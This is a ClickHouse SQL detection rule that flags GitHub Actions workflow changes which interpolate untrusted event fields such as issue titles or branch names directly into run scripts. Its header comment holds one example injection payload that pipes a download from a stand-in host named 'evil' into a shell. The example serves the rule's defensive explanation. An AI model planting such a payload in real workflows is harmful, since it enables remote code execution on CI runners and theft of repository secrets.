-- GH-004 v1.0.0: script injection through an untrusted expression context.
--
-- Input: github.workflow.modified events (github.api). The collector's workflow analyser
-- lists in attributes.script_injection_added every `${{ ... }}` expression of an untrusted
-- context (github.event.issue.title/body, pull_request.title/body/head.ref, comment.body,
-- head_commit.message, github.head_ref, ...: the GitHub Security Lab list) that the new
-- workflow version interpolates into a `run:` script or an actions/github-script `script`,
-- and that the old version did not. The runner substitutes the expression into the script
-- text BEFORE the shell runs it, so a title such as `a"; curl evil | sh; "` executes.
-- Passing the value through `env:` and quoting the shell variable is the safe pattern and
-- produces no entry.
-- attributes.script_injection_added is null for a lexical-fallback comparison (not
-- analysed): a blind spot, not an alert.
--
-- Identity: repository, commit and workflow path. Confidence: high (structured analysis of
-- both versions is required for the attribute to exist). Duplicate-safe via LIMIT 1 BY
-- event_id.
WITH
    ev AS (
        SELECT
            event_id,
            event_time,
            asset_id,
            asset_type,
            ifNull(gh_repository, '') AS repository,
            coalesce(gh_workflow_path, resource_path, '') AS workflow_path,
            assumeNotNull(gh_commit_sha) AS commit_sha,
            coalesce(gh_actor_login, actor_name, '') AS actor,
            ifNull(gh_ref, '') AS ref,
            arraySlice(JSONExtract(attributes, 'script_injection_added', 'Array(String)'), 1, 32)
                AS injections,
            JSONExtract(attributes, 'triggers_after', 'Array(String)') AS triggers_after,
            JSONExtractString(attributes, 'permissions_after') AS permissions_after,
            JSONExtractString(attributes, 'change_type') AS change_type
        FROM events
        WHERE event_time >= {window_start:DateTime64(3, 'UTC')}
          AND event_time < {window_end:DateTime64(3, 'UTC')}
          AND source_type = 'github.api'
          AND event_type = 'github.workflow.modified'
          AND gh_commit_sha IS NOT NULL
          AND notEmpty(JSONExtract(attributes, 'script_injection_added', 'Array(String)'))
        LIMIT 1 BY event_id
    )
SELECT
    concat(e.repository, '|', e.workflow_path) AS group_key,
    any(e.asset_id) AS asset_id,
    any(e.asset_type) AS asset_type,
    min(e.event_time) AS first_seen,
    max(e.event_time) AS last_seen,
    uniqExact(e.event_id) AS event_count,
    arrayMap(x -> x.2, groupArraySorted(500)(tuple(e.event_time, e.event_id))) AS evidence_event_ids,
    map('repository', e.repository, 'workflow_path', e.workflow_path, 'commit_sha', e.commit_sha,
        'actor', any(e.actor), 'ref', any(e.ref)) AS entities,
    toJSONString(CAST(tuple(
        arraySort(groupUniqArrayArray(32)(e.injections)),
        arraySort(groupUniqArrayArray(16)(e.triggers_after)),
        any(e.permissions_after),
        any(e.change_type)
    ), concat('Tuple(injected_expressions Array(String), triggers Array(String), ',
              'permissions_after String, change_type String)'))) AS features,
    e.commit_sha AS signature,
    'high' AS confidence
FROM ev AS e
GROUP BY e.repository, e.workflow_path, e.commit_sha
ORDER BY first_seen
